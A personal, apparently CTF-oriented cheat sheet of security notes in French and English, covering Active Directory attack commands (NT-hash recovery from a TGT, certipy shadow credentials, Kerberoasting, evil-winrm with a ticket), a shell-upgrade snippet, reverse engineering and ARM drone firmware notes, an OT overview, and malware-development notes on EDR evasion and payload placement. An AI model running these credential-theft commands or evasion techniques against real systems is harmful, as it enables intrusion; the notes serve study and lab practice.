A TGT (Ticket Granting Ticket) includes in the ticket a `PAC_CREDENTIAL_INFO` structure containing the NTLM keys (i.e. LM and NT hashes) of the authenticating user. This feature allows users to switch to NTLM authentications when remote servers don't support Kerberos. Once the TGT is obtained, and the session key extracted (printed by gettgtpkinit.py), the getnthash.py script can be used to recover the NT hash.

```bash
export KRB5CCNAME=tgt.cache
getnthash.py -key bb9f7c3c55592b8eafe07e8ed27a812add9c96066dc1ea8805e65b002da8d036 "$DOMAIN"/management_svc
[*] Using TGT from cache
[*] Requesting ticket to self with PAC
Recovered NT Hash
a091c1832bcdd4677c28b5a6a1295584
```
</details>

<details>

<summary>Automatic way !</summary>

```bash
certipy shadow auto -username management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584 -account ca_operator
```

</details>

### Evil-winrm with TGT

Change the /etc/krb5.conf like this :

```bash
[libdefaults]
  default_realm = VINTAGE.HTB
  ticket_lifetime = 24h
  renew_lifetime = 7d
  forwardable = true

[realms]
  VINTAGE.HTB = {
    kdc = dc01.vintage.htb
    admin_server = dc01.vintage.htb
  }

[domain_realm]
  .vintage.htb = VINTAGE.HTB
  vintage.htb = VINTAGE.HTB
```

```bash
KRB5CCNAME=./c.neri.ccache evil-winrm -i "$TARGET" -r "$DOMAIN"
```

### Kebreoast

```bash
targetedKerberoast.py -v -d "$DOMAIN" -u "$USER" -p "$PASSWORD"
```

If issue of time:

```bash
faketime "$(rdate -n $DC_IP -p | awk '{print $2, $3, $4}' | date -f - "+%Y-%m-%d %H:%M:%S")" zsh
```

### UPN changement


## Amazing reverse shell

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm  #This will give you commands as clear
ctrl + z # To background the session
stty raw -echo; fg  #You get an interactive lovely shell!
```

</details>

## Cryptographie

### RSA Bascis

RSA key pair is generated with 3 information : e, p, q

## Reverse Engineering

<details>
<!-- <summary>details</summary> -->

### Introduction

#### Compilers

Instructions (Assembly Code) -> binary code (Asselbled Bytecode)
Tools like hydra allow binary code -> Assembly code

#### Linking

Entry point
Used to define memory regions

#### ELF - Executable Linking Format

Symbols table : this function at this location, this var at this loc

`.symtab` Symbols used for debugging.
`.dynsym` Symbols for dynamic linking.

=> How to setup everything

#### CCL

Machine Code -> Assembly Language = Disassembly

### Computer Architecture

When a program is running :

1. Instruction is read into memory
2. Instruction is processed by the ALU
3. The result of the operation is stored into registers or memory

Registers : x86_64 uses 16 64bit general purpose registers

RIP : Insutrction pointer

Intruction : operation being performed by the CPU.

RSP : top of the stack

RBP : base pointer

### Stack Frame

RBP vs RSP ?

how do we know param_2(argv[1]) is at local_28.

#### Default One

```
|--------------------|
|    return address  | <-- RBP (frame pointer)
|--------------------|
|    previous RBP    |
|--------------------|
|    param_1 (argc)  | <-- [RBP + 0x10]
|--------------------|
|    param_2 (argv)  | <-- [RBP + 0x(1|2)8]
|--------------------|
|    local_10        | <-- [RBP + 0x10] (local variables)
|--------------------|
|    local_28        | <-- [RBP + 0x28] (local variables)
|--------------------|
```

## TP Secu IMT

buffer
ebr : données de remplissage, inutile ici
eip : adresse suivante de la fonction (ce qui sera executé après)
esp : adresse d execution en terinant la fonction

=> il faut mettre autre chose dans eip, ici esp
dans esp, nous pouvons mettre l adresse dans laquelle nous voulons continuer
Tout simplement la suivante, qui contient

</details>

Rouge : pas dans la mémoire

l :label
t :type
f :function
g :goto


## ARM Reversing

GHIDRA better tables ?

créer le projet ghidra
congifurer la memory map
chercher la main
Analyse RF functions
Computing Flight Command (elaboration consigne de vol)
Hijacking the drone ?

Processus itératif. analyse, test, check => affiner le code C
On cherche quelque chose de suffisament précis, pas la vérité

R13 Stack counter (sp)
R16 Program counter => prochaine

As a reverser what information are stored in the memory ?

Obj1: Data exchanged between the remote and the drone
Obj2: rf secured ?
Obj3: pilot the drone from an other equipement ?

Definir les zones de RAM et les différentes ressources
Activation de liens de `cross reference` dans Ghidra

CTRL+f memory mapping =>identifier les zones et les saisir dans Ghidra

Find main ? Première instruction executée par le micro controller ?

ISR ? Evts Materiel, déclenche execution logicielle

Vector table ? Tableau avec tt les addr qui gèrent les evts materiel
On y trouve l addr de la première instruction executee
offest 0 => valeur de SP au reset
offset 4 => valeur de PC au reset

Avant le main, initalisation de la RAM

Reconstituation des fonctions/var au fur et a mesure

Decouverte d'une seconde fonction aui met à jour les commandes de vol
Il se trouve que les valeurs modifiés sont prises depuis un registre précis, UART.

### ARM

ldr (load register)

Quelles sont les addresses mémoires ? Quelles sont les addresses de la flash ?

push puis sub => allocation mémoire
puis appel fonction

sub : reduire la pile
pop : restorer le context initial vers la fonction appelante

ARM aggressive instruction finder

Main en ARM :
initalisation ressources hw == configuration des paramètres => mesures d etat, remise à 0 des capteurs
Je mesure mes entrees, j anayse la donnée, je fais une application
lancement dans une boucle infinie

updateInputs
updateInternalState
updateOutputs

little endian car commence par le bit de poids faible

## OT course

<details>

ISA99 ???

IT = Information Technology (Laptop, servers used to store and process data)
OT = Operational Technology (Manages any process that manipulate some type of actions in the real world)
ICS = Industrial Control System (Larger scale deployement of OT in industrial environnements)

OT priority = physical / environnmental safety

Usually OT can connect to IT but IT can't reach to OT. Because IT is connected to Internet so it will be compromised.
=> Firewell between IT and OT

### Ways Attackers Enter ICS/OT Networks

- From the IT network
- Control System exposed to the Internet
- Remote access capabilities (upgrade frimware from home (=safety) )
- Malicious Insiders

### OT example

Thermostat. It's a computer and code to know what he has to do. Buttons to set variables.
And then the OT device recevies data continually from outside sensors/sources. If it's too hot, send signal to turn on air conditioning.
=> PLC

Same idea when talking about nuclear plants.

### Where the risk come from ?

Gain access and control the assets. Then can control the physical stuff => Safety Issues.

### SCADA

ICS = LAN
SCADA = Supervisory Control And Data Acquisition = WAN = multiple systmes that connects together over wide areas.

Assets Owners / Operators. Not always the same

### Threat Actors

- Natation state
- Criminal Organizations
- Ransomware Groups
- Hacktivits
- Cyber mercenaries
- Lone Wolf
- Script kiddies

### Example : The Colonial Pipeline

Ransomware Attack by BlackSide
()

</details>

## Maldev

<details>

### Win arch

Application run in User Mode

Operating system components run in Kernel Mode

The app can't do taks, so it relies on the kernel mode following precise pattern

User Processes -> Subsystem DLLs (export WinAPI function. Ex : kernel32.dll, ntdll.dll, advapi32.dll, user32.dll) -> NTDLL.DLL (system wide DLL, lowest in User Mode. Create transition between user mode and kernel mode, referred ad Native API or NTAPI) -> Exective Kernel (kernel mode, partially stored in ntoskernel.dll)

#### Function call flow

user application call in WinAPI CreateFile in kernel32.dll. Kernel32.dll exposes application to the WinAPI therefore it's loaded by most of the app. Next CreateFile call it's equivalent in the NTAPI NtCreatFile trough ntdll.dll. Then ntdll.dll executes systecenter (x86) or syscall (x64) which transfers execution to kernel mode. The kernel NtCreateFile function then calls kernel modules to perform the task

### Win memory management

Processes -> virtual memory -> physical memory (or disk)

Concept of memory paging : divides memory into chunks of 4kb : "pages"

Page state: free, reserved (for future use), committed (charges allocated, load into physical memory by the system on the first attempt to read or write)

Once committed, pages need to have protection options : https://learn.microsoft.com/en-us/windows/win32/memory/memory-protection-constants

Exemples :

- PAGE_NOACCESS : disable access to commited page
- PAGE_EXECUTE_READWRITE : enable read write and execute. Highly discouraged
- PAGE_READONLY : Enable read only to the region of comitted of pages. Access violation on write attempt

### Memory protection

- DEP : Code can't be exectued from regions that are not explicitely marked as executable
- ASLR : Address space layout randomization. Randomly arranged addresse of processes including base, position of the stack, heap and librairies

### Intro to win API

#### Data types

- DWORD: unsigned integer
- size_t: size of an object
- VOID: absence of type
- PVOID: pointer to any data
- HANDLE: special object that the os is managing
- LPCSTR/PCSTR: pointer to a constant an ANSI null-terminated string. L is for long
- LPSTR/PSTR: same as above but readable and writable string
- LPCWSTR/PCWSTR: point to a constant an Unicode null-terminated String
- PWSTR/LPWSTR: same as above but readable and writable string
- wchar_t: used to represent wide chars
- ULONG_PTR: to use for arithmetic manipulation of pointer :
  > PVOID Pointer = malloc(100);
  >
  > // Pointer = Pointer + 10; // not allowed
  >
  > Pointer = (ULONG_PTR)Pointer + 10; // allowed

#### ANSI & Unicode functions

There is CreateFileA (ANSI) and CreateFileW (Wide - Unicode)

ANSI take LPCSTR/PCSTR as argument. Unicode take LPCWSTR/PCWSTR as argument:

```C
LPCSTR str1[] = "maldev"; // 7 bytes (maldev + null byte).

LPCWSTR str2[] = L"maldev"; // 14 bytes, each character is 2 bytes (The null byte is also 2 bytes)
```

#### In and Out parameters

```C
BOOL HackTheWorld(OUT int* num){

    // Setting the value of num to 123
    *num = 123;
    
    // Returning a boolean value
    return TRUE;
}

int main(){
    int a = 0;

    // 'HackTheWorld' will return true
    // 'a' will contain the value 123
    HackTheWorld(&a);
}
```

### Windows Native API (NTAPI) errors via macro

```C
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)

NTSTATUS STATUS = NativeSyscallExample(...);
if (!NT_SUCCESS(STATUS)){
    // printing the error in unsigned integer hexadecimal format
    printf("[!] NativeSyscallExample Failed With Status : 0x%0.8X \n", STATUS); 
}

```

### Pe Structure

e_magic : 0x5A4D or MZ
e_lfanew : Hold the offest of the start of the NT Header

NT_Header : FileHeader and OptionalHeader

### DLL

DLL are shared librairies of executable functions

System Wide DLL Based are loaded at the same address by different process to improve performance

### Detection Mechanisms

#### Heuristic Detection

Static heuristic: decompil le programme + et check un % de ressemblance 

Dynamic heursitic: programme mis ds une sandbox et comportement analysé

#### Behavior based detection

#### API Hooking

The EDR will hook the API and analyse all the parameters made in the call.

#### Import Address Table Table

It contains the functions names that are used in the PE. One solution is to use API hashing

### Windows Process

Memory types of Windows Processes :

- Private memory : deditacted to a single process
- Mapped memory : for data shared between processes. Can't be modifed by other processes
- Image memory : store the code and data of the process


#### Process Environnement Block

Contains information about : parameters, heap information, loaded DLLs. 

#### Ldr

Pointer to PEB_LDR_DATA. Information about loaded DLLs, base address and size.

Can be leveraged to find the base address of DLLs and functions in it's memory space. Can be used to build custom versions of GetModuleHandleA/W

#### AtlThunkSListPtr & AtlThunkSListPtr32

Used by the Active Template Library to store pointer to thunking functions. thunking functions are used to call functions implemented in a different address space

#### TLS Slots

Thread Local Storage. Each thread have a Thread Environnement Block with multiple TlsSlots.

### Payload placement (.data vs .rdata vs .text vs .rsrc)

.data contain the initliazed global static variables

.rdata are read_only

.data and .rdata can be merged. can also be merged in .text

.text needs to be explicitely told to the compiler (#pragma section(".text")). Stores variable in executable region memory. Can be used for less than 10 bytes payload

.rsrc, to avoid size limit in.data and .rdata

Data is not accessible directly. Need to use special functions.



</details>
